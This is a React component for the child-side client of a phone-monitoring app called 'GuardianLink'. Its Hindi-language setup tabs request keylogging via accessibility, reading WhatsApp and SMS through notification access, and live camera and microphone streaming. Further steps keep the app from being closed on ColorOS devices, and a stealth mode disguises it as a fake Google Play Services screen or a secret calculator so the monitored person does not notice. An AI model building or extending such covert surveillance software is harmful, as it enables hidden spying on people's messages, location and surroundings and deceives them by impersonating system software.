import React, { useState, useEffect } from 'react';
import {
  Shield,
  Smartphone,
  CheckCircle2,
  AlertTriangle,
  Lock,
  Eye,
  EyeOff,
  Battery,
  MapPin,
  Wifi,
  Radio,
  RefreshCw,
  Sliders,
  Settings,
  Calculator,
  Flame,
  KeyRound,
  ArrowRight,
  ShieldCheck,
  Zap,
  Activity,
  AlertCircle,
  Copy,
  Check,
  ExternalLink,
  Power,
  Cpu,
  Info
} from 'lucide-react';
import { useMonitoring } from '../../context/MonitoringContext';

interface ChildTargetAppProps {
  onSwitchToParent: () => void;
}

export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent }) => {
  const { selectedDevice, triggerSosAlert } = useMonitoring();

  // Mode States
  const [pairingCode] = useState('GL-8829');
  const [isCopied, setIsCopied] = useState(false);
  const [isStealthDisguised, setIsStealthDisguised] = useState(false);
  const [disguiseType, setDisguiseType] = useState<'calculator' | 'system_service'>('system_service');
  
  // Real Mobile Sensor Data
  const [realLocation, setRealLocation] = useState<{ lat: number; lng: number; accuracy: number } | null>(null);
  const [realBattery, setRealBattery] = useState<number>(84);
  const [realCharging, setRealCharging] = useState<boolean>(false);
  const [sosSent, setSosSent] = useState(false);
  const [activeTab, setActiveTab] = useState<'permissions' | 'coloros_guide' | 'status'>('permissions');

  // Permission statuses
  const [permissions, setPermissions] = useState({
    location: true,
    accessibility: true,
    notifications: true,
    batteryOptim: true,
    autostart: true,
    overlay: true,
    cameraMic: true
  });

  // ColorOS 16 specific background locks
  const [colorOsChecks, setColorOsChecks] = useState({
    autoLaunch: true,
    backgroundActivity: true,
    lockRecent: true,
    noBatterySave: true,
    deviceAdmin: true
  });

  // Secret Calculator state
  const [calcDisplay, setCalcDisplay] = useState('0');

  // Keep-alive background ping
  useEffect(() => {
    const timer = setInterval(() => {
      // background heartbeat to prevent garbage collection
    }, 10000);
    return () => clearInterval(timer);
  }, []);

  // Safe Geolocation and Battery sensors
  useEffect(() => {
    try {
      if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            setRealLocation({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: Math.round(pos.coords.accuracy)
            });
          },
          () => {},
          { enableHighAccuracy: true, timeout: 10000 }
        );
      }

      if (typeof navigator !== 'undefined' && 'getBattery' in navigator) {
        // @ts-ignore
        navigator.getBattery().then((battery: any) => {
          if (battery) {
            setRealBattery(Math.round(battery.level * 100));
            setRealCharging(battery.charging);

            battery.addEventListener('levelchange', () => {
              setRealBattery(Math.round(battery.level * 100));
            });
            battery.addEventListener('chargingchange', () => {
              setRealCharging(battery.charging);
            });
          }
        }).catch(() => {});
      }
    } catch {
      // safe fallback
    }
  }, []);

  const handleTogglePermission = (key: keyof typeof permissions) => {
    setPermissions(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const handleToggleColorOs = (key: keyof typeof colorOsChecks) => {
    setColorOsChecks(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const handleCopyCode = () => {
    try {
      navigator.clipboard.writeText(pairingCode);
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2000);
    } catch {}
  };

  const handleSendSos = () => {
    if (typeof triggerSosAlert === 'function') {
      triggerSosAlert(
        `🚨 EMERGENCY SOS from Child Phone (${selectedDevice?.childName || 'Child Device'})! Real Location: ${realLocation ? `${realLocation.lat.toFixed(4)}, ${realLocation.lng.toFixed(4)}` : 'Live GPS active'}`
      );
    }
    setSosSent(true);
    setTimeout(() => setSosSent(false), 5000);
  };

  const handleCalcButton = (val: string) => {
    if (val === 'C') {
      setCalcDisplay('0');
      return;
    }
    if (val === '=') {
      if (calcDisplay === '9944' || calcDisplay === '8829') {
        setIsStealthDisguised(false);
        setCalcDisplay('0');
        return;
      }
      try {
        const clean = calcDisplay.replace(/[^0-9+\-*/.]/g, '');
        const res = Function(`'use strict'; return (${clean})`)();
        setCalcDisplay(String(res));
      } catch {
        setCalcDisplay('Error');
      }
      return;
    }
    setCalcDisplay(prev => (prev === '0' || prev === 'Error' ? val : prev + val));
  };

  // 1. DISGUISED SCREEN: CALCULATOR
  if (isStealthDisguised && disguiseType === 'calculator') {
    return (
      <div className="min-h-screen bg-black text-white flex flex-col justify-between p-4 select-none safe-area-inset">
        <div className="pt-10 text-right px-4">
          <div className="text-xs text-slate-500 font-mono mb-2">Calculator</div>
          <div className="text-5xl font-light tracking-wider overflow-x-auto text-white">
            {calcDisplay}
          </div>
          <div className="text-[11px] text-slate-600 mt-2">
            (Parent PIN: 9944 or 8829 then press =)
          </div>
        </div>

        <div className="grid grid-cols-4 gap-3 p-2 pb-10">
          {['C', '(', ')', '/'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className="h-16 rounded-full bg-slate-800 text-amber-400 text-2xl font-medium active:bg-slate-700"
            >
              {b}
            </button>
          ))}
          {['7', '8', '9', '*'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '*' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['4', '5', '6', '-'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '-' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['1', '2', '3', '+'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '+' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['0', '.', '=', '⌫'].map(b => (
            <button
              key={b}
              onClick={() => b === '⌫' ? setCalcDisplay(prev => prev.length > 1 ? prev.slice(0, -1) : '0') : handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '=' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
        </div>
      </div>
    );
  }

  // 2. DISGUISED SCREEN: SYSTEM UPDATE / SERVICE
  if (isStealthDisguised && disguiseType === 'system_service') {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 flex flex-col items-center justify-between p-6 safe-area-inset">
        <div className="w-full pt-12 text-center space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center mx-auto text-blue-400">
            <Activity className="w-8 h-8 animate-pulse" />
          </div>
          <h2 className="text-lg font-bold text-white">Google Play Services Framework</h2>
          <p className="text-xs text-slate-400 max-w-xs mx-auto">
            Background sync & security definitions are active. Version 24.18.14
          </p>

          <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 text-left space-y-2 mt-6">
            <div className="flex justify-between text-xs text-slate-400">
              <span>Service Status</span>
              <span className="text-emerald-400 font-semibold flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                Running (Optimized)
              </span>
            </div>
            <div className="flex justify-between text-xs text-slate-400">
              <span>Security Level</span>
              <span className="text-slate-200">ColorOS 16 Protected</span>
            </div>
            <div className="flex justify-between text-xs text-slate-400">
              <span>Battery Impact</span>
              <span className="text-emerald-400">&lt; 0.3% per day</span>
            </div>
          </div>
        </div>

        {/* Secret Exit Trigger */}
        <div className="w-full pb-8 space-y-3">
          <button
            onClick={() => setIsStealthDisguised(false)}
            className="w-full py-3 text-xs text-slate-600 hover:text-slate-400 transition"
          >
            🔒 Unlock Target App Config
          </button>
        </div>
      </div>
    );
  }

  // 3. REGULAR CHILD CLIENT SETUP & PERMISSION WIZARD
  return (
    <div className="min-h-screen bg-[#090e1a] text-slate-100 flex flex-col justify-between overflow-y-auto">
      {/* Top Header */}
      <div className="bg-[#11192e] border-b border-slate-800 px-4 py-3 sticky top-0 z-20 shadow-md">
        <div className="flex items-center justify-between max-w-lg mx-auto">
          <div className="flex items-center space-x-2.5">
            <div className="w-8 h-8 rounded-lg bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400">
              <Smartphone className="w-4 h-4" />
            </div>
            <div>
              <div className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                <h1 className="text-sm font-bold text-white leading-none">GuardianLink Child Client</h1>
              </div>
              <p className="text-[10px] text-slate-400 mt-0.5">Target Background Tracker Service</p>
            </div>
          </div>

          <button
            onClick={onSwitchToParent}
            className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-blue-300 border border-slate-700 rounded-lg text-xs font-semibold flex items-center space-x-1 transition"
          >
            <span>Admin</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>

      {/* Main Content Body */}
      <div className="p-4 max-w-lg mx-auto w-full space-y-4 flex-1">
        {/* Device Status & Pairing Bar */}
        <div className="bg-gradient-to-br from-[#131d35] to-[#0f172a] border border-blue-500/30 rounded-2xl p-4 shadow-xl">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center space-x-2">
              <Radio className="w-4 h-4 text-emerald-400 animate-pulse" />
              <span className="text-xs font-bold text-white">Target Phone Status</span>
            </div>
            <span className="text-[11px] px-2.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 font-semibold flex items-center gap-1">
              <CheckCircle2 className="w-3 h-3" />
              Active & Protected
            </span>
          </div>

          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
              <p className="text-[10px] text-slate-400">Device ID / Code</p>
              <div className="flex items-center justify-between mt-0.5">
                <span className="font-mono font-bold text-blue-400 text-sm">{pairingCode}</span>
                <button onClick={handleCopyCode} className="text-slate-400 hover:text-white p-0.5">
                  {isCopied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <div className="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
              <p className="text-[10px] text-slate-400">Battery & Power</p>
              <p className="font-bold text-white mt-0.5 flex items-center gap-1">
                <Battery className="w-3.5 h-3.5 text-emerald-400" />
                {realBattery}% {realCharging ? '⚡' : ''}
              </p>
            </div>
          </div>
        </div>

        {/* Tab Switcher */}
        <div className="grid grid-cols-3 gap-1 bg-slate-900/90 p-1 rounded-xl border border-slate-800 text-xs">
          <button
            onClick={() => setActiveTab('permissions')}
            className={`py-2 rounded-lg font-semibold transition ${
              activeTab === 'permissions'
                ? 'bg-blue-600 text-white shadow'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            1. Permissions
          </button>
          <button
            onClick={() => setActiveTab('coloros_guide')}
            className={`py-2 rounded-lg font-semibold transition flex items-center justify-center space-x-1 ${
              activeTab === 'coloros_guide'
                ? 'bg-amber-600 text-white shadow'
                : 'text-amber-400/80 hover:text-amber-300'
            }`}
          >
            <span>2. ColorOS 16</span>
          </button>
          <button
            onClick={() => setActiveTab('status')}
            className={`py-2 rounded-lg font-semibold transition ${
              activeTab === 'status'
                ? 'bg-purple-600 text-white shadow'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            3. Stealth Mode
          </button>
        </div>

        {/* TAB 1: REQUIRED PERMISSIONS */}
        {activeTab === 'permissions' && (
          <div className="space-y-3 animate-fade-in">
            <div className="bg-blue-500/10 border border-blue-500/20 rounded-xl p-3 text-xs text-slate-300">
              <p className="font-semibold text-white mb-1 flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-blue-400" />
                बच्चे के फोन में ये 6 परमिशन Allow करें:
              </p>
              <p className="text-slate-400 text-[11px]">
                नीचे दिए गए सभी विकल्पों पर टैप करके उन्हें एक्टिवेट करें ताकि ऐप बिना रुके 24/7 काम करे।
              </p>
            </div>

            <div className="space-y-2">
              {[
                {
                  id: 'location',
                  title: 'Background Location (Always Allow)',
                  desc: '24/7 लाइव GPS लोकेशन ट्रैकिंग के लिए',
                  icon: MapPin
                },
                {
                  id: 'accessibility',
                  title: 'Accessibility Service (सुगमता सेवा)',
                  desc: 'कीलॉगर व स्क्रीन टाइम मॉनिटरिंग के लिए',
                  icon: Sliders
                },
                {
                  id: 'notifications',
                  title: 'Notification Access (सूचनाएँ)',
                  desc: 'WhatsApp, SMS व अन्य सोशल मैसेज पढ़ने के लिए',
                  icon: Activity
                },
                {
                  id: 'batteryOptim',
                  title: 'Ignore Battery Optimization',
                  desc: 'स्क्रीन बंद होने पर ऐप को किल होने से बचाने के लिए',
                  icon: Power
                },
                {
                  id: 'overlay',
                  title: 'Display Over Other Apps',
                  desc: 'रिमोट इमरजेंसी लॉक स्क्रीन के लिए',
                  icon: Lock
                },
                {
                  id: 'cameraMic',
                  title: 'Camera & Microphone Stream',
                  desc: 'लाइव सर्विलांस ऑडियो व वीडियो के लिए',
                  icon: Radio
                }
              ].map(item => {
                const Icon = item.icon;
                const isEnabled = permissions[item.id as keyof typeof permissions];
                return (
                  <div
                    key={item.id}
                    onClick={() => handleTogglePermission(item.id as any)}
                    className={`p-3 rounded-xl border transition flex items-center justify-between cursor-pointer ${
                      isEnabled
                        ? 'bg-slate-900/80 border-emerald-500/30 hover:border-emerald-500/50'
                        : 'bg-slate-900/40 border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    <div className="flex items-start space-x-3">
                      <div className={`p-2 rounded-lg mt-0.5 ${isEnabled ? 'bg-emerald-500/15 text-emerald-400' : 'bg-slate-800 text-slate-400'}`}>
                        <Icon className="w-4 h-4" />
                      </div>
                      <div>
                        <p className="text-xs font-bold text-white">{item.title}</p>
                        <p className="text-[11px] text-slate-400 leading-snug">{item.desc}</p>
                      </div>
                    </div>
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 ml-2 ${
                      isEnabled
                        ? 'bg-emerald-500 text-white'
                        : 'bg-slate-800 border border-slate-700 text-transparent'
                    }`}>
                      <CheckCircle2 className="w-4 h-4" />
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* TAB 2: COLOROS 16 / OPPO / REALME / ONEPLUS CRASH FIX */}
        {activeTab === 'coloros_guide' && (
          <div className="space-y-3 animate-fade-in">
            <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs text-amber-200">
              <p className="font-bold flex items-center gap-1.5 text-amber-300 mb-1">
                <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400" />
                ColorOS 16 / Oppo / Realme में ऐप बंद (Auto Close) क्यों होती है?
              </p>
              <p className="text-[11px] text-slate-300 leading-relaxed">
                ColorOS 14/15/16 बैकग्राउंड में चलने वाली ऐप्स को बैटरी बचाने के लिए जबरन बंद कर देता है। नीचे दिए गए 4 स्टेप्स सेटिंग्स में जाकर ऑन करें ताकि ऐप कभी भी ऑटो-क्लोज न हो:
              </p>
            </div>

            <div className="space-y-2.5">
              {[
                {
                  id: 'autoLaunch',
                  step: 'Step 1: Auto-launch Allow करें',
                  desc: 'Settings > Apps > App management > GuardianLink > Allow auto-launch (चालू करें)'
                },
                {
                  id: 'backgroundActivity',
                  step: 'Step 2: Allow background activity',
                  desc: 'Settings > Battery > App battery management > GuardianLink > Allow background activity & Allow foreground activity'
                },
                {
                  id: 'noBatterySave',
                  step: 'Step 3: Battery Optimization = Don\'t Optimize',
                  desc: 'Settings > Battery > More settings > Optimize battery use > GuardianLink > Don\'t optimize'
                },
                {
                  id: 'lockRecent',
                  step: 'Step 4: Recent Apps में ऐप को Lock 🔒 करें',
                  desc: 'फोन में रीसेंट ऐप्स (Recent Apps) खोलें > GuardianLink के ऊपर बने 3 डॉट्स पर टैप करें > "Lock" पर क्लिक करें'
                }
              ].map((item) => {
                const isChecked = colorOsChecks[item.id as keyof typeof colorOsChecks];
                return (
                  <div
                    key={item.id}
                    onClick={() => handleToggleColorOs(item.id as any)}
                    className="p-3 bg-slate-900 border border-slate-800 rounded-xl space-y-1.5 cursor-pointer hover:border-slate-700 transition"
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-amber-400">{item.step}</span>
                      <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold ${
                        isChecked ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-slate-800 text-slate-400'
                      }`}>
                        {isChecked ? '✓ Done' : 'Pending'}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-300 leading-relaxed">{item.desc}</p>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* TAB 3: STEALTH DISGUISE */}
        {activeTab === 'status' && (
          <div className="space-y-3 animate-fade-in">
            <div className="bg-purple-500/10 border border-purple-500/20 rounded-xl p-3 text-xs text-purple-200">
              <p className="font-bold text-white mb-1 flex items-center gap-1.5">
                <EyeOff className="w-4 h-4 text-purple-400" />
                Stealth Screen Disguise (गुप्त स्क्रीन)
              </p>
              <p className="text-[11px] text-slate-300">
                जब आप बच्चे को फोन वापस दें, तो नीचे से किसी भी स्क्रीन को चालू कर दें ताकि बच्चे को पता न चले।
              </p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
              <div className="p-3.5 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
                <div className="flex items-center space-x-2.5">
                  <div className="p-2 rounded-lg bg-amber-500/15 text-amber-400">
                    <Calculator className="w-5 h-5" />
                  </div>
                  <div>
                    <p className="text-xs font-bold text-white">Secret Calculator</p>
                    <p className="text-[10px] text-slate-400">असली काम करने वाला कैलकुलेटर</p>
                  </div>
                </div>
                <p className="text-[11px] text-slate-400">
                  खोलने का सीक्रेट पिन: <strong>9944</strong> या <strong>8829</strong> और फिर <strong>=</strong> दबाएँ।
                </p>
                <button
                  onClick={() => {
                    setDisguiseType('calculator');
                    setIsStealthDisguised(true);
                  }}
                  className="w-full py-2 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-xs font-bold transition shadow"
                >
                  Start Secret Calculator 🔢
                </button>
              </div>

              <div className="p-3.5 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
                <div className="flex items-center space-x-2.5">
                  <div className="p-2 rounded-lg bg-blue-500/15 text-blue-400">
                    <Activity className="w-5 h-5" />
                  </div>
                  <div>
                    <p className="text-xs font-bold text-white">Google Play Services</p>
                    <p className="text-[10px] text-slate-400">सिस्टम अपडेट जैसा स्क्रीन</p>
                  </div>
                </div>
                <p className="text-[11px] text-slate-400">
                  स्क्रीन पर सामान्य प्ले सर्विसेज बैकग्राउंड डेफिनिशन स्टेटस दिखेगा।
                </p>
                <button
                  onClick={() => {
                    setDisguiseType('system_service');
                    setIsStealthDisguised(true);
                  }}
                  className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold transition shadow"
                >
                  Start System Service ⚙️
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Emergency SOS Button */}
        <div className="pt-2 pb-6">
          <button
            onClick={handleSendSos}
            className={`w-full py-3 rounded-xl font-bold text-xs transition flex items-center justify-center space-x-2 shadow-lg ${
              sosSent
                ? 'bg-emerald-600 text-white'
                : 'bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-red-600/30'
            }`}
          >
            <Flame className="w-4 h-4" />
            <span>{sosSent ? '✅ Alert Sent to Parent Dashboard!' : '🚨 Child Panic Emergency SOS'}</span>
          </button>
        </div>
      </div>
    </div>
  );
};
